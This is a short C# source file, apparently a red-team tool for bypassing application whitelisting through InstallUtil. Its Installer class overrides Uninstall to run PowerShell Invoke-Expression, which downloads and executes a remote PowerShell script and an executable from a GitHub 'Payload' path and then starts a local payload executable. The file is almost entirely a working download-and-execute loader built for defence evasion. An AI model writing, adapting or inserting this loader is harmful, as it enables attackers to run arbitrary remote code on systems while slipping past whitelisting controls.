using System;
using System.Management.Automation;
// edit the .csproj to add this reference.
namespace Whitelist
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
[System.ComponentModel.RunInstaller(true)]
// Install need be added in reference, just put "install" in search box.
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        PowerShell ps = PowerShell.Create();
        ps.AddCommand("Invoke-Expression");
        ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntil.ps1')");
        ps.Invoke();

        PowerShell ps2 = PowerShell.Create();
        ps2.AddCommand("Invoke-Expression");
        ps2.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntilOnlinePayload.exe')");
        ps2.Invoke();

        PowerShell ps3 = PowerShell.Create();
        ps3.AddCommand("Invoke-Expression");
        ps3.AddArgument("Start-Process -FilePath 'Csharp4InstallUntilOfflinePayload.exe'");
        ps3.Invoke();
    }
}